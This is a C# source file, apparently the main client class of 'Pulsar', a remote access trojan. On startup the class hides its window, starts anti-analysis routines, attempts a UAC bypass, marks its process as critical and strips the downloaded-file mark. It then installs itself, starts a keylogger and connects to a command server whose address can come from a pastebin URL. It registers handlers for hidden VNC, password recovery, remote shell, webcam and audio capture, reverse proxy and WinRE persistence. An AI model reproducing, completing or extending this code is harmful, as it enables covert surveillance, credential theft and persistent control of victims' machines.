using Pulsar.Client.Anti;
using Pulsar.Client.Config;
using Pulsar.Client.Helper.UAC;
using Pulsar.Client.Logging;
using Pulsar.Client.LoggingAPI;
using Pulsar.Client.Messages;
using Pulsar.Client.Networking;
using Pulsar.Client.Setup;
using Pulsar.Client.User;
using Pulsar.Client.Utilities;
using Pulsar.Common.DNS;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.ClientManagement;
using Pulsar.Common.UAC;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Client
{
    /// <summary>
    /// The client application which handles basic bootstrapping of the message processors and background tasks.
    /// </summary>
    public class PulsarApplication : Form
    {
        /// <summary>
        /// A system-wide mutex that ensures that only one instance runs at a time.
        /// </summary>
        public SingleInstanceMutex ApplicationMutex;

        /// <summary>
        /// The client used for the connection to the server.
        /// </summary>
        private PulsarClient _connectClient;

        /// <summary>
        /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
        /// </summary>
        private readonly List<IMessageProcessor> _messageProcessors;

        /// <summary>
        /// The background keylogger service used to capture and store keystrokes.
        /// </summary>
        private KeyloggerService _keyloggerService;

        /// <summary>
        /// Keeps track of the user activity.
        /// </summary>
        private ActivityDetection _userActivityDetection;

        private ActiveWindowChecker _activeWindowChecker;
        private ClipboardChecker _clipboardChecker;
        private DebugLog _debugLog;

        /// <summary>
        /// Determines whether an installation is required depending on the current and target paths.
        /// </summary>
        private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;

        /// <summary>
        /// Notification icon used to show notifications in the taskbar.
        /// </summary>
        private readonly NotifyIcon _notifyIcon;

        /// <summary>
        /// Initializes a new instance of the <see cref="PulsarApplication"/> class.
        /// </summary>
        public PulsarApplication()
        {
            _messageProcessors = new List<IMessageProcessor>();
            _notifyIcon = new NotifyIcon();
        }

        /// <summary>
        /// Starts the application.
        /// </summary>
        /// <param name="e">An System.EventArgs that contains the event data.</param>
        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Run();
            base.OnLoad(e);
        }

        /// <summary>
        /// Begins running the application.
        /// </summary>
        public void Run()
        {
            // decrypt and verify the settings
            if (!Settings.Initialize())
                Environment.Exit(1);

            ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);

            // check if process with same mutex is already running on system
            if (!ApplicationMutex.CreatedNew)
                Environment.Exit(2);

            Manager.StartAnti();

            if (Settings.UACBYPASS && !UAC.IsAdministrator())
            {
                Debug.WriteLine("Attempting UAC bypass...");
                Bypass.DoUacBypass();
                Environment.Exit(5);
            }

            if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
            {
                Debug.WriteLine("Setting process as critical...");
                NativeMethods.RtlSetProcessIsCritical(1, 0, 0);
            }

            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);

            var installer = new ClientInstaller();

            if (IsInstallationRequired)
            {
                // close mutex before installing the client
                ApplicationMutex.Dispose();

                try
                {
                    installer.Install();
                    Environment.Exit(3);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }
            }
            else
            {
                try
                {
                    // (re)apply settings and proceed with connect loop
                    installer.ApplySettings();
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }

                if (Settings.ENABLELOGGER)
                {
                    _keyloggerService = new KeyloggerService();
                    _keyloggerService.Start();
                }

                PulsarClient client;
                string hosts = Settings.HOSTS;

                if (Settings.PASTEBIN && 
                    (hosts.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || 
                     hosts.StartsWith("https://", StringComparison.OrdinalIgnoreCase)))
                {
                    Debug.WriteLine("Using pastebin mode with URL: " + hosts);
                    var hostsManager = new HostsManager(hosts);
                    client = new PulsarClient(hostsManager, Settings.SERVERCERTIFICATE);
                }
                else
                {
                    Debug.WriteLine("Using standard host list mode");
                    var hostsList = new HostsConverter().RawHostsToList(hosts);
                    var hostsManager = new HostsManager(hostsList);
                    client = new PulsarClient(hostsManager, Settings.SERVERCERTIFICATE);
                }

                _connectClient = client;
                _connectClient.ClientState += ConnectClientOnClientState;
                InitializeMessageProcessors(_connectClient);

                _userActivityDetection = new ActivityDetection(_connectClient);
                _userActivityDetection.Start();

                _activeWindowChecker = new ActiveWindowChecker(_connectClient);
                _clipboardChecker = new ClipboardChecker(_connectClient);
                _debugLog = new DebugLog(_connectClient);
                UniversalDebugLogger.Initialize(_connectClient);

                new Thread(() =>
                {
                    // Start connection loop on new thread and dispose application once client exits.
                    // This is required to keep the UI thread responsive and run the message loop.
                    _connectClient.ConnectLoop();
                    Environment.Exit(0);
                }).Start();
            }
        }

        [System.Runtime.CompilerServices.MethodImpl(
    System.Runtime.CompilerServices.MethodImplOptions.NoInlining |
    System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
        private void ConnectClientOnClientState(Networking.Client s, bool connected)
        {
            if (connected)
            {
                _notifyIcon.Text = "Pulsar Client\nConnection established";
                
                string currentWindowTitle = GetCurrentWindowTitle();
                _connectClient.Send(new SetUserActiveWindowStatus { WindowTitle = currentWindowTitle });
            }
            else
                _notifyIcon.Text = "Pulsar Client\nNo connection";
        }

        /// <summary>
        /// Gets the title of the currently active window.
        /// </summary>
        /// <returns>The title of the active window.</returns>
        private string GetCurrentWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = NativeMethods.GetForegroundWindow();

            if (NativeMethods.GetWindowText(handle, buff, nChars) > 0)
            {
                return buff.ToString();
            }
            return null;
        }

        /// <summary>
        /// Adds all message processors to <see cref="_messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
        /// </summary>
        /// <param name="client">The client which handles the connection.</param>
        /// <remarks>Always initialize from UI thread.</remarks>
        private void InitializeMessageProcessors(PulsarClient client)
        {
            //preview stuff
            _messageProcessors.Add(new PreviewHandler());
            _messageProcessors.Add(new PingHandler());

            _messageProcessors.Add(new QuickCommandHandler());
            _messageProcessors.Add(new HVNCHandler());

            _messageProcessors.Add(new ClientServicesHandler(this, client));
            _messageProcessors.Add(new FileManagerHandler(client));
            _messageProcessors.Add(new KeyloggerHandler());
            _messageProcessors.Add(new MessageBoxHandler());
            _messageProcessors.Add(new ClipboardHandler());
            _messageProcessors.Add(new KematianHandler());
            _messageProcessors.Add(new FunStuffHandler());
            _messageProcessors.Add(new GDIHandler());
            _messageProcessors.Add(new PasswordRecoveryHandler());
            _messageProcessors.Add(new RegistryHandler());
            _messageProcessors.Add(new RemoteDesktopHandler());
            _messageProcessors.Add(new RemoteWebcamHandler());
            _messageProcessors.Add(new RemoteShellHandler(client));
            _messageProcessors.Add(new ReverseProxyHandler(client));
            _messageProcessors.Add(new ShutdownHandler());
            _messageProcessors.Add(new StartupManagerHandler());
            _messageProcessors.Add(new SystemInformationHandler());
            _messageProcessors.Add(new TaskManagerHandler(client));
            _messageProcessors.Add(new TcpConnectionsHandler());
            _messageProcessors.Add(new WebsiteVisitorHandler());
            _messageProcessors.Add(new RemoteScriptingHandler());
            _messageProcessors.Add(new AudioHandler());
            _messageProcessors.Add(new AudioOutputHandler());
            _messageProcessors.Add(new RemoteChatHandler());
            _messageProcessors.Add(new WinREPersistenceHandler());
            _messageProcessors.Add(new PluginHandler());

            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Register(msgProc);
            }
        }

        /// <summary>
        /// Disposes all message processors of <see cref="_messageProcessors"/> and unregisters them from the <see cref="MessageHandler"/>.
        /// </summary>
        private void CleanupMessageProcessors()
        {
            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Unregister(msgProc);
                if (msgProc is IDisposable disposableMsgProc)
                    disposableMsgProc.Dispose();
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                CleanupMessageProcessors();
                _keyloggerService?.Dispose();
                _userActivityDetection?.Dispose();
                ApplicationMutex?.Dispose();
                _connectClient?.Dispose();
                _notifyIcon.Visible = false;
                _notifyIcon.Dispose();
                _debugLog?.Dispose(); // Dispose DebugLog
            }
            base.Dispose(disposing);
        }
    }
}
